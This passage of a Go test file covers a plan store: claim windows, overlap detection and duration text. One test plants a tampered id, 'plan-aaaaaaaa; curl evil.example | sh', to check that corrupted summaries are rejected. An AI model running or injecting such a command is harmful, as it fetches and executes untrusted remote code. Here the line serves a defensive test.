		t.Errorf("%s\nwant %s", got, want)
	}
}

// The windows of the design, as numbers and not as the constants that are meant to be them.
func TestTheWindowsAreThoseOfTheDesign(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, clock *time.Time) {
		ctx := context.Background()
		// A collector's claim holds ten minutes.
		a := putPlan(t, ps, t0, "alice", 0, change("a", ActionCreate, 0))
		if err := ps.updateProgress(ctx, a.ID, func(p *PlanProgress) error {
			p.Collecting = &PlanClaim{By: "other#2", At: t0}
			return nil
		}); err != nil {
			t.Fatal(err)
		}
		*clock = t0.Add(9 * time.Minute)
		if err := ps.BeginApply(ctx, a.ID, "alice#1"); err == nil {
			t.Error("an apply began 9 minutes after a collector's claim")
		}
		*clock = t0.Add(11 * time.Minute)
		if err := ps.BeginApply(ctx, a.ID, "alice#1"); err != nil {
			t.Errorf("an apply was refused 11 minutes after a collector's claim: %v", err)
		}
		// An apply that did not end keeps the plan a day.
		m := &PlanMeta{}
		*clock = t0.Add(23 * time.Hour)
		if why := planInUse(m, &PlanProgress{Applying: []PlanClaim{{By: "x", At: t0}}}, *clock); why == "" {
			t.Error("an apply 23 hours ago does not keep the plan")
		}
		*clock = t0.Add(25 * time.Hour)
		if why := planInUse(m, &PlanProgress{Applying: []PlanClaim{{By: "x", At: t0}}}, *clock); why != "" {
			t.Errorf("an apply 25 hours ago keeps the plan: %s", why)
		}
		// A stale plan is kept an hour after it was marked.
		b := putPlan(t, ps, t0, "bob", 0, change("b", ActionUpdate, 1))
		moved := stateAt(map[string]int{"b": 2})
		*clock = t0.Add(time.Minute)
		collect(t, ps, GCOptions{Check: moved})
		*clock = t0.Add(46 * time.Minute)
		if res := collect(t, ps, GCOptions{Check: moved}); len(res.Removed) != 0 {
			t.Errorf("45 minutes after the mark: %+v", res.Removed)
		}
		*clock = t0.Add(62 * time.Minute)
		if res := collect(t, ps, GCOptions{Check: moved}); ids(res.Removed) != b.ID {
			t.Errorf("61 minutes after the mark: %+v", res.Removed)
		}
	})
}

// Plans that two others overlap on are named once per resource, and a change that a
// plan has applied is not one it makes any more.
func TestOverlapsNameEachResourceOnceAndIgnoreWhatWasApplied(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, _ *time.Time) {
		ctx := context.Background()
		mine := putPlan(t, ps, t0, "alice", 0, change("a", ActionUpdate, 1))
		twice := gcPlan(t0.Add(time.Minute), change("a", ActionUpdate, 1), change("a", ActionReplace, 1), change("b", ActionCreate, 0))
		theirs := putFile(t, ps, twice, "bob", 0)
		es, _ := ps.Entries(ctx, nil)
		over := Overlaps(es, mine.ID, mine.Changes)
		if len(over) != 1 || strings.Join(over[0].Addrs, ",") != "a" {
			t.Fatalf("%+v", over)
		}
		if err := ps.MarkApplied(ctx, theirs.ID, []string{"a"}, "txn-1", []string{"a", "b"}); err != nil {
			t.Fatal(err)
		}
		es, _ = ps.Entries(ctx, nil)
		if over := Overlaps(es, mine.ID, mine.Changes); len(over) != 0 {
			t.Errorf("a change that was applied still overlaps: %+v", over)
		}
		if got := Touching(es, "a"); len(got) != 1 || got[0].Meta.ID != mine.ID {
			t.Errorf("touching a: %d", len(got))
		}
	})
}

// The id of a plan is the name of its objects: a summary that says another id is not
// read, and a listing says which plans it could not read.
func TestASummaryThatNamesAnotherPlanIsNotReadAndTheListingSaysSo(t *testing.T) {
	eachBackend(t, func(t *testing.T, ps *PlanStore, _ *time.Time) {
		ctx := context.Background()
		good := putPlan(t, ps, t0, "alice", 0, change("a", ActionCreate, 0))
		evil := putPlan(t, ps, t0.Add(time.Second), "bob", 0, change("b", ActionCreate, 0))
		data, _ := ps.B.Get(ctx, metaKey2(evil.ID))
		hostile := strings.Replace(string(data), `"id": "`+evil.ID+`"`, `"id": "plan-aaaaaaaa; curl evil.example | sh"`, 1)
		if hostile == string(data) {
			t.Fatalf("no id in %s", data)
		}
		if err := ps.B.Put(ctx, metaKey2(evil.ID), []byte(hostile)); err != nil {
			t.Fatal(err)
		}
		newer := putPlan(t, ps, t0.Add(2*time.Second), "carol", 0, change("c", ActionCreate, 0))
		nd, _ := ps.B.Get(ctx, progressKey(newer.ID))
		_ = nd
		if err := ps.B.Put(ctx, progressKey(newer.ID), []byte("{torn")); err != nil {
			t.Fatal(err)
		}
		if _, err := ps.Meta(ctx, evil.ID); err == nil || !strings.Contains(err.Error(), "names another plan") {
			t.Errorf("%v", err)
		}
		es, skipped, err := ps.EntriesAndSkipped(ctx, nil)
		if err != nil {
			t.Fatal(err)
		}
		if len(es) != 1 || es[0].Meta.ID != good.ID {
			t.Errorf("listed %d", len(es))
		}
		if len(skipped) != 2 {
			t.Fatalf("skipped %+v", skipped)
		}
		got := map[string]string{}
		for _, sk := range skipped {
			got[sk.ID] = sk.Err.Error()
		}
		if !strings.Contains(got[evil.ID], "names another plan") || !strings.Contains(got[newer.ID], "not readable") {
			t.Errorf("reasons %v", got)
		}
		if es2, err := ps.Entries(ctx, nil); err != nil || len(es2) != 1 {
			t.Errorf("Entries: %d, %v", len(es2), err)
		}
	})
}

func TestDurationText(t *testing.T) {
	for d, want := range map[time.Duration]string{
		0:                              "a moment",
		29 * time.Second:               "a moment",
		31 * time.Second:               "1 minute",
		90 * time.Second:               "2 minutes",
		59 * time.Minute:               "59 minutes",
		60 * time.Minute:               "1 hour",
		90 * time.Minute:               "1 hour 30 minutes",
		2 * time.Hour:                  "2 hours",
		25 * time.Hour:                 "1 day 1 hour",
		48 * time.Hour:                 "2 days",
		7*24*time.Hour - 3*time.Minute: "7 days",
		6*24*time.Hour + 23*time.Hour:  "6 days 23 hours",
		6*24*time.Hour + 22*time.Hour + 40*time.Minute: "6 days 23 hours",
		7*24*time.Hour + 20*time.Minute:                "7 days",
		7*24*time.Hour + 40*time.Minute:                "7 days 1 hour",
	} {
		if got := DurationText(d); got != want {
			t.Errorf("%v: %q, want %q", d, got, want)
		}
	}
	for d, want := range map[time.Duration]string{
		time.Hour:                       "1 hour",
		90 * time.Minute:                "90 minutes",
		36 * time.Hour:                  "36 hours",
		7 * 24 * time.Hour:              "7 days",
		24 * time.Hour:                  "1 day",
		2 * time.Minute:                 "2 minutes",
		time.Minute:                     "1 minute",
		90*time.Minute + 30*time.Second: "1 hour 31 minutes",
	} {
		if got := SpanText(d); got != want {
			t.Errorf("%v: %q, want %q", d, got, want)
		}
	}
}
